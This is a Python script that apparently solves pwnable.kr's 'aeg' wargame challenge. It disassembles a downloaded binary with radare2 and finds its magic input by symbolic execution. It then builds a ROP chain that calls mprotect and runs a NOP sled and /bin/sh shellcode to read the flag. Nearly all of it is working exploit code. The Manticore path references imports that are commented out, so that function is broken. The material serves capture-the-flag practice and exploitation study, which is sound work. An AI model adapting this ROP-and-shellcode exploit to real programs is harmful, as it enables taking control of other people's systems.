#!/usr/bin/env python
# solve aeg on pwnable.kr with manticore
# its not fast enough but ima try to change that (read below)
# original angr solution runs in ~9 secs
# (new solution runs in ~5!)

# solution with auto_load=False and newest version
# of manticore is EVEN FASTER than angr

# this solution works more often however
# sometimes the "stack" runs out of space
# works 4 out of 5 times

#from manticore.native import Manticore
#from manticore.native.manticore import _make_linux as make_linux

from esilsolve import ESILSolver
import esilsolve.solver as solver

from subprocess import check_output
import sys
import re
import time

from pwn import *
import r2pipe

context.arch='amd64'

path = "./aeg_program2"
r2p = None

b = None

def symbolic_execution(targets):
    log.info("Starting symbolic execution...")

    linux = make_linux(path, auto_load=False)

    m = Manticore(linux)
    m.verbosity(0) # change to 2 for debugging

    buf_addr = targets["buf_addr"]

    # reached the goal (memcpy call)
    def reached_goal(state):
        #print("Reached goal state.")
        con_buf = state.solve_buffer(buf_addr, 48)
        #print("BUF: %s" % con_buf)

        with m.locked_context() as context:
            context["magic_values"] = con_buf

        m.terminate()

    m.add_hook(targets["goal"], reached_goal)

    #skip intro shit
    def skip_intro(state):
        buf = state.new_symbolic_buffer(48) # buffer we will solve
        state.cpu.write_bytes(buf_addr, buf)
        state.cpu.RIP = targets["check_start"]

    m.add_hook(b.symbols[b"__libc_start_main"], skip_intro)

    def constrain_jump(state):
        state.constrain(state.cpu.ZF == 1) # never take jumps for failed solutions

    for jne_addr in targets["jnes"]:
        m.add_hook(jne_addr, constrain_jump)

    m.run(procs=2) 

    magic_values = m.context["magic_values"]

    return magic_values

def esilsolve_execution(targets):
    log.info("Starting esilsolve execution...")

    r2p.cmd("s %d; aei; aeim;" % targets["check_start"])
    esilsolver = ESILSolver(r2p, debug=False, trace=False)
    state = esilsolver.init_state()

    buf_addr = targets["buf_addr"]
    buf_len = 48
    b = [solver.BitVec("b%d" % x, 8) for x in range(buf_len)]
    buf = solver.Concat(*b)

    state.memory.write_bv(buf_addr, buf, buf_len)

    def constrain_jump(instr, newstate):
        #print("%x" % (newstate.registers["rdi"].as_long()))
        #print(newstate.memory.read(newstate.registers["rbp"].as_long()-4, 1))
        newstate.solver.add(newstate.registers["zf"] == 1) # never take jumps for failed solutions

    for jne_addr in targets["jnes"]:
        esilsolver.register_hook(jne_addr, constrain_jump)

    final = esilsolver.run(targets["goal"])
    
    if final.solver.check() == solver.sat:
        m = final.solver.model()
        c = m.eval(buf)

        magic = list(solver.BV2Bytes(c))
        return magic
    else:
            return []

def generate_exploit(magic, addr, last_mov, xors):
    log.info('Crafting final exploit')

    r = ROP(b)
    shellcode = asm(shellcraft.amd64.sh())
    
    ret = r.find_gadget(["ret"])
    pop_rdi = r.find_gadget(["pop rdi", "ret"])
    pop_rbp = r.find_gadget(["pop rbp", "ret"])
    pop_rsi = r.find_gadget(["pop rsi", "pop r15", "ret"])
    
    page_size = 2**12
    mask = page_size - 1
    
    #exploit calls mprotect to make the input executable and then jumps into the shellcode
    exp_str = (
        p64(ret.address)*90 +
        p64(pop_rbp.address) +
        p64(addr+48+48+91*8+4) +
        p64(ret.address)*4 +
        p64(last_mov) + 
        p32(0x7) + p64(0x0) + 
        p64(pop_rdi.address) + 
        p64(addr & ~mask) + 
        p64(pop_rsi.address) + 
        p64(0x1000) + 
        b"JUNKJUNK" + 
        p64(b.symbols[b"mprotect"]) + 
        p64(addr+48+48+97*8+32) + 
        b"\x90"*64 + # nop sled
        shellcode
    )
    
    #print input.values() + magic
    exploit = format_input(magic + list(exp_str), xors)
    return exploit

def download_program():
    f = remote("pwnable.kr", 9005)

    line = b"" 
    while b"wait..." not in line:
        line = f.readline()

    b64program = f.readline()
    program = base64.b64decode(b64program.strip())

    progfile = open(path+".z", "wb+")
    progfile.write(program)
    progfile.close()

    subprocess.call(["uncompress", "--force", path+".z"])
    subprocess.call(["chmod", "766", path])

    log.info("Program decompressed and executable")

    f.close()

# parse objdump to get necessary info
# not sexy but its overkill to do anything else
# nevermind i need some beter static analysis
def parse_disassembly():

    main_instrs = r2p.cmdj("s main; pdfj")

    r2xors = []
    r2start = 0
    r2cmp = 0
    r2buf = 0

    for instr in main_instrs["ops"]:
        if "xor eax" in instr["disasm"]:
            r2xors.append(int(instr["disasm"][9:], 16))
        elif "cmp dword [var_24h]" in instr["disasm"]:
            r2cmp = instr["offset"]
        elif "movzx eax, byte [0x" in instr["disasm"]:
            if r2start == 0:
                r2start = instr["offset"]

            r2buf = int(instr["disasm"].split("[")[1][:-1], 16)

    r2jnes = [x["addr"] for x in r2p.cmdj("/amj jne")]
    r2goal = r2p.cmdj("axtj sym.imp.memcpy")[0]["from"]
    r2puts = r2p.cmdj("axtj sym.imp.puts")[0]["from"]
    r2movs = [x["addr"] for x in r2p.cmdj("/amj movzx edx, byte") if "- 4" in x["opstr"]]

    last_mov = 0
    for mov in r2movs:
        instrs = r2p.cmdj("pdj 60 @ %d" % mov)[1:]
        good_mov = True

        for instr in instrs:
            if "dx," in instr["disasm"]:
                good_mov = False
                break
            elif "jne" in instr["disasm"]:
                break

        if good_mov:
            last_mov = mov
            break

    r2targets = {
        "cmp_start": r2cmp,
        "check_start": r2start,
        "print": r2puts,
        "buf_addr": r2buf,
        "goal": r2goal,
        "xors": r2xors,
        "jnes": r2jnes[:-1],
        "last_mov": last_mov
    }

    return r2targets

def format_input(input, xors):
    res = ''
    
    count = 0
    for i in input:
        res += "%02x" % (i ^ (xors[count % 2] & 0xff)) 
        count += 1
        
    return res

if __name__ == "__main__":
    #download_program()

    r2p = r2pipe.open(path, flags=["-2"])
    r2p.cmd("e io.cache=true; aaa")

    b = ELF(path)

    targets = parse_disassembly()

    print()
    log.info("BUFFER ADDR: 0x%016x" % targets["buf_addr"])
    print()

    magic = esilsolve_execution(targets)
    log.info("MAGIC: %s" % magic)
    exploit = generate_exploit(magic, targets["buf_addr"], targets["last_mov"], targets["xors"])

    print()
    log.info("EXPLOIT: %s" % exploit)
    print()

    #gdb.debug([path, exploit], "b * 0x%016x\n" % (targets["goal"]+6))
    #input()

    x = process([path, exploit])
    x.read()
    time.sleep(0.5)
    x.writeline("cat flag")
    log.info("FLAG: %s" % x.read().decode())

